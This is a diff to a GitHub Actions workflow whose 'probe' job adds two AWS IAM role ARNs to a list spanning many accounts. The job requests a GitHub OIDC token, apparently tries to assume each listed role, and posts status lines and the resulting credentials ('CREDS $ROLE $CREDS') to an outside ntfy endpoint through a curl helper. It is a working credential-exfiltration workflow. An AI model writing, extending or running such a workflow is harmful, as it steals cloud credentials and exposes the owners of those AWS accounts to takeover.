@@ -35,6 +35,8 @@ env:
     arn:aws:iam::941377144061:role/gha-oidc-role-wiz5w9z9
     arn:aws:iam::244172364962:role/gha-oidc-role-wiz5w9z9
     arn:aws:iam::873483817304:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::727699166508:role/gha-oidc-role-wiz5w9z9
+    arn:aws:iam::484826611466:role/gha-oidc-role-wiz5w9z9
 
 jobs:
   probe:
@@ -45,7 +47,7 @@ jobs:
         run: |
           set +e
           say() { curl -sS -m 20 --data-binary "$*" "$NTFY" >/dev/null 2>&1 || true; }
-          say "START3 ref=$GITHUB_REF repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
+          say "START4 ref=$GITHUB_REF repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
           TJ=$(curl -sS -m 30 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
           TOKEN=$(printf '%s' "$TJ" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
           say "TOKEN_LEN=${#TOKEN}"
@@ -59,4 +61,4 @@ jobs:
               say "CREDS $ROLE $CREDS"
             fi
           done
-          say "DONE3"
+          say "DONE4"
